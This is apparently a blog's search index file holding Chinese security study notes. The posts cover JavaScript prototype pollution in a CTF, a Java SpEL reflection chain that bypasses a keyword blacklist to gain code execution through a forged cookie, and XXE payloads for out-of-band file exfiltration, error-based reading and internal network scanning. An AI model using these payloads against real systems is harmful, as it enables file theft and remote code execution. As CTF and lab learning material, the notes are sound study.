@@ -1,0 +1,150 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>漏洞复现-Apache SSI远程命令执行</title>
+      <link href="/2020/01/30/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache-SSI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+      <url>/2020/01/30/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache-SSI%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Apache </tag>
+            
+            <tag> RCE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>每天一道leetcode-链表题</title>
+      <link href="/2020/01/30/%E6%AF%8F%E5%A4%A9%E4%B8%80%E9%81%93leetcode-%E9%93%BE%E8%A1%A8%E9%A2%98/"/>
+      <url>/2020/01/30/%E6%AF%8F%E5%A4%A9%E4%B8%80%E9%81%93leetcode-%E9%93%BE%E8%A1%A8%E9%A2%98/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>每天一个Linux命令-dig</title>
+      <link href="/2020/01/30/%E6%AF%8F%E5%A4%A9%E4%B8%80%E4%B8%AALinux%E5%91%BD%E4%BB%A4-dig/"/>
+      <url>/2020/01/30/%E6%AF%8F%E5%A4%A9%E4%B8%80%E4%B8%AALinux%E5%91%BD%E4%BB%A4-dig/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>域名解析记录</title>
+      <link href="/2020/01/30/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95/"/>
+      <url>/2020/01/30/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JavaScript原型链污染</title>
+      <link href="/2020/01/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
+      <url>/2020/01/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
+      
+        <content type="html"><![CDATA[<h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><h2 id="如何继承"><a href="#如何继承" class="headerlink" title="如何继承"></a>如何继承</h2><p>比如，现在有一个”动物”对象的构造函数。</p><pre><code class="javascript">function Animal(){this.species = &quot;动物&quot;;}</code></pre><p>还有一个”猫”对象的构造函数。</p><pre><code class="JavaScript">function Cat(name,color){　　　　this.name = name;　　　　this.color = color;　　}</code></pre><p>要让<code>Cat</code>这个类去继承<code>Animal</code>类，如果在其他的语言中，一般就是<code>extented</code>即可</p><p>但是在JavaScript中，</p><pre><code class="javascript">Cat.prototype = new Animal();Cat.prototype.constructor = Cat;var cat1 = new Cat(&quot;大毛&quot;,&quot;黄色&quot;);alert(cat1.species); // 动物</code></pre><p>第一行我们直接修改了<code>Cat</code>的<code>prototype</code>属性，让其指向<code>Animal</code></p><p>这一点不难理解，之后所有<code>Cat</code>实例化的对象cat，它的<code>__proto__</code>就会指向<code>Animal</code>(因为<code>Cat.prototype==cat.__proto__</code>)</p><p>但是第二行比较疑惑，<code>Cat.prototype.constructor</code>又代表了什么？</p><p>其实在<code>Cat.prototype</code>中原先是有一个<code>constructor</code>这个属性的，而<code>Cat.prototype.constructor==Cat</code>这个是成立的</p><p>但是我们直接修改了<code>Cat.prototype</code>之后，此时的<code>Cat.prototyep.constructot != Cat</code></p><p>这就比较荒诞了，所以我们要单独修改将这一个属性修改回来</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="redpwnctf2019-blueprint"><a href="#redpwnctf2019-blueprint" class="headerlink" title="redpwnctf2019 blueprint"></a>redpwnctf2019 blueprint</h3><p>题目的简要功能就是能够发表文章，并且选择是否公开，传递的数据是json格式的</p><p>每一个用户有一个<code>user_id</code>，第一次访问的时候会通过<code>makeId</code>函数给一个id</p><p><img src="/2020/01/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1572246225198.png" alt></p><p>调试的时候发现每个用户创建的时候会将一个<code>(userId,user)</code>存入到一个map中，<code>userId</code>就是之前生成的，而这个<code>user</code>对象中就有flag，也就是说每一个用户都有一个flag</p><p>生成的<code>user</code>对象</p><p><img src="/2020/01/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1572246345905.png" alt></p><p>之后会将请求的内容给<code>merge</code>到<code>parsedBody</code>中</p><p>查看<code>defaultsDeep</code>的例子：</p><pre><code>_.defaultsDeep({ &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39; } }, { &#39;user&#39;: { &#39;name&#39;: &#39;fred&#39;, &#39;age&#39;: 36 } });// =&gt; { &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39;, &#39;age&#39;: 36 } }</code></pre><p>之后就会将<code>parsedBody</code>中的<code>content</code>和<code>public</code>存放到map中</p><p><img src="/2020/01/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1572246569945.png" alt></p><p>之后的功能也不难想了，如果<code>pubic</code>为true就会展示在首页上，如果不为true就会不会展示</p><p>而我们之前提到每一个用户其实都是有一个flag的，只是这个<code>public</code>属性没有进行设置而已。</p><p>思路就是通过原型链污染使得flag能被展示出来</p><p>渲染页面的主要部分如下：</p><pre><code class="javascript">blueprints: Object.entries(user.blueprints).map(([k, v]) =&gt; ({  id: k,  content: v.content,  public: v.public,})),</code></pre><p>exp</p><pre><code class="python">import requestsURL = &quot;http://localhost/&quot;user_id = &quot;559eb9b06eb8c581b74f33c1202bff50&quot;res = requests.post(URL+&quot;make&quot;,cookies={&quot;user_id&quot;:user_id},json={&quot;content&quot;:&quot;aaaa&quot;, &quot;public&quot;:&quot;true&quot;,&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;public&quot;:&quot;true&quot;}}})print(res.text)res2 = requests.get(URL, cookies={&quot;user_id&quot;:user_id})print(res2.text)</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> JavaScript </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>java审计笔记</title>
+      <link href="/2020/01/30/java%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/"/>
+      <url>/2020/01/30/java%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="java审计笔记"><a href="#java审计笔记" class="headerlink" title="java审计笔记"></a>java审计笔记</h1><h2 id="反射相关概念"><a href="#反射相关概念" class="headerlink" title="反射相关概念"></a>反射相关概念</h2><p>首先需要明白 Class 类</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>java的反序列化是通过<code>ObjectOutputStream</code>和<code>ObjectInputStream</code>两个类来实现的，同时要序列化的类必须实现<code>Serializable</code>接口</p><p>与PHP类似，Java在序列化一个对象的时候会调用<code>writeObject</code>方法，在反序列化一个对象的时候会调用<code>readObject</code>方法</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="code-breaking-javacon"><a href="#code-breaking-javacon" class="headerlink" title="code-breaking javacon"></a>code-breaking javacon</h3><p>一个spring框架写的登陆界面，用户名和密码都是admin，有一个remember me可以勾选</p><p><code>application.yml</code>中有一些相关的设置</p><pre><code class="yaml">keywords:  blacklist:     - java.+lang    - Runtime    - exec.*\(user:  username: admin  password: admin  rememberMeKey: c0dehack1nghere1</code></pre><p>有一个黑名单过滤了一些字符，不过可以很容易地用字符串拼接进行绕过</p><p>仔细分析代码，其中有存在一处类似模板渲染的语句</p><pre><code class="java">ParserContext parserContext = new TemplateParserContext();Expression exp = parser.parseExpression(val, parserContext);SmallEvaluationContext evaluationContext = new SmallEvaluationContext();return exp.getValue(evaluationContext).toString();</code></pre><blockquote><p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。</p></blockquote><p>这一处位于<code>getAdvanceValue</code>函数中，调用它的是这里：</p><pre><code class="java">@GetMappingpublic String admin(@CookieValue(value = &quot;remember-me&quot;, required = false) String rememberMeValue,                    HttpSession session,                    Model model) {    if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(&quot;&quot;)) {        String username = userConfig.decryptRememberMe(rememberMeValue);        if (username != null) {            session.setAttribute(&quot;username&quot;, username);        }    }    Object username = session.getAttribute(&quot;username&quot;);    if(username == null || username.toString().equals(&quot;&quot;)) {        return &quot;redirect:/login&quot;;    }    model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));    return &quot;hello&quot;;}</code></pre><p>这里相当于是admin的管理界面，首先会检查<code>rememberMeValue</code>的值，并且尝试去解密其中的用户名，同时加入到<code>session</code>中，之后执行<code>model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));</code></p><p>那么这里的关键就是<code>cookie</code>中的rememberMeValue，由于我们已经知道了加密的算法和密钥(代码都是直接给的)，那么就可以通过伪造<code>rememberMeValue</code>来达到rce</p><p>首先需要一条java的反射链，因为要绕过一些关键字：</p><pre><code class="java">String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,String.class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),&quot;calc&quot;)</code></pre><p>之后要将其构造成Spel表达式，就是增加一个<code>T()</code></p><p>先本地测试弹一个计算器</p><pre><code class="java">System.out.println(Encryptor.encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#{T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]{\&quot;calc\&quot;})}&quot;)); //注意java的字符串必须是双引号</code></pre><p>生成payload</p><pre><code>bvik1nAmjEAllRdn5UKWGC9uCj0hW0P2B6k1uigkS1acKxD9b_xNi-x09UGgjU1DvDEI2GGk4Jn0ApM_cSVc0G7kGnvvtewNRVsfqFUCR0fMAPqbj6yqACW6XVtt8Fp1nBwebKd7pkYSZCv6Yj3X7H-0-8HDV6F3sS3yWHUQEBPAyiNmKfkSKUV5VVlNdo16Nij8YX8HvKdeMHJ7_5Sdjfmfq3dKPeUOivMyVp_GdEkffgly4YX4eWCOzQRr4uQgodsKw2pC9N9udnw3Fz7O5ZhzmoYttjLubBowMtkF-Q6HHCvBrK9SWCzRQXC6jqYX_XeqyZuDreUixnpXpzlN9Gj_AWy8DB8Dxea8atf2wr8=</code></pre><p>之后登陆再替换掉cookie</p><p><img src="/2020/01/30/java%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/1573973547431-1580346732870.png" alt="结果"></p><h3 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h3>]]></content>
+      
+      
+      <categories>
+          
+          <category> 代码审计 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> java </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>XXE复习</title>
+      <link href="/2020/01/30/XXE%E5%A4%8D%E4%B9%A0/"/>
+      <url>/2020/01/30/XXE%E5%A4%8D%E4%B9%A0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="常用payload分析"><a href="#常用payload分析" class="headerlink" title="常用payload分析"></a>常用payload分析</h2><p>好像大家都用这个测试代码</p><pre><code class="php">&lt;?phplibxml_disable_entity_loader(false);$xmlfile = file_get_contents(&quot;php://input&quot;);$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds = simplexml_import_dom($dom);var_dump($creds);</code></pre><p>使用XML发送数据：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY a SYSTEM &quot;http://localhost:8887/aaaaa&quot;&gt;]&gt;&lt;root&gt;&amp;a;&lt;/root&gt;</code></pre><p>但是我在尝试参数实体的时候似乎不能外带数据</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root[&lt;!ENTITY % a &quot;http://localhost:8887/aaa&quot;&gt;%a;]&gt;&lt;root&gt;&lt;/root&gt;</code></pre><p><img src="/2020/01/30/XXE%E5%A4%8D%E4%B9%A0/1580302730124.png" alt="1580302730124"></p><p>嵌套也是不行的</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % file SYSTEM &quot;file:///flag.txt&quot;&gt;      &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost:8887/?%file;&#39;&gt;&quot;&gt;    %start;    %send;]&gt;</code></pre><p>最常用的外带数据的方法：</p><p>在自己的vps上准备两个文件，我这里就就都在本机做的实验</p><p>本地的8001端口开一个web服务，</p><p><img src="/2020/01/30/XXE%E5%A4%8D%E4%B9%A0/1580302833010-1580342074917.png" alt="1580302833010"></p><p><code>local.xml</code> 文件内容：</p><pre><code class="xml">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost:8887/?%file;&#39;&gt;&quot;&gt;%start;</code></pre><p>这个文件表示读取到数据之后发送给另一个8887端口，然后我们向受害者服务器发送数据，</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ENTITY % remote SYSTEM &quot;http://localhost:8001/local.xml&quot;&gt;      &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=./flag.txt&quot;&gt;    %remote;    %send;]&gt;&lt;message&gt;1234&lt;/message&gt;</code></pre><p>然后就可以在8887端口接收到数据了</p><p><img src="/2020/01/30/XXE%E5%A4%8D%E4%B9%A0/1580302962486-1580342120888.png" alt="1580302962486"></p><p>换一种 <code>payload</code> 也行</p><p>DTD文件</p><pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://localhost:8887/p=%file;&#39;&gt;&quot;&gt;</code></pre><p>发送的 paylod</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://localhost:8001/local.xml&quot;&gt;%remote;%int;%send;]&gt;</code></pre><h2 id="报错XXE"><a href="#报错XXE" class="headerlink" title="报错XXE"></a>报错XXE</h2><p>这个方法p牛其实早就说过了,通过三层嵌套的XML就可以达到报错</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [    &lt;!ELEMENT message ANY&gt;    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;    &lt;!ENTITY % para &#39;        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;        &amp;#x25;para2;    &#39;&gt;    %para;]&gt;&lt;message&gt;10&lt;/message&gt;</code></pre><p><img src="/2020/01/30/XXE%E5%A4%8D%E4%B9%A0/1580303152983-1580342131433.png" alt="1580303152983"></p><h2 id="XXE探测内网"><a href="#XXE探测内网" class="headerlink" title="XXE探测内网"></a>XXE探测内网</h2><pre><code class="xml">import requestsimport base64#Origtional XML that the server accepts#&lt;xml&gt;#    &lt;stuff&gt;user&lt;/stuff&gt;#&lt;/xml&gt;def build_xml(string):    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;    xml = xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;    send_xml(xml)def send_xml(xml):    headers = {&#39;Content-Type&#39;: &#39;application/xml&#39;}    x = requests.post(&#39;http://127.0.0.1/xml.php&#39;, data=xml, headers=headers, timeout=5).text    coded_string = x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value    print coded_string#   print base64.b64decode(coded_string)for i in range(1, 255):    try:        i = str(i)        ip = &#39;192.168.1.&#39; + i        string = &#39;php://filter/convert.base64-encode/resource=http://&#39; + ip + &#39;/&#39;        print string        build_xml(string)    except:      print &quot;error&quot;continue</code></pre><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> xxe </tag>
+            
+            <tag> xml </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
